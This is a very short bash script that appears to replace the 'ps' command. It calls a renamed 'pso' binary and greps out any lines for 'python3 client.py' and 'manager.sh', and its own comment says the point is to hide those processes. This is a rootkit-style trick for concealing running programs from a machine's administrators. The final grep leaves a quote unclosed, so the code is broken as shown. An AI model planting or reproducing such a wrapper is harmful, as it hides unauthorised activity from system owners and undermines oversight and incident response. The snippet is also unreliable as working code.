#!/bin/bash
# hide manager.sh and client.py from ps
pso aux | grep -v "python3 [c]lient.py" | grep -v "manager.sh
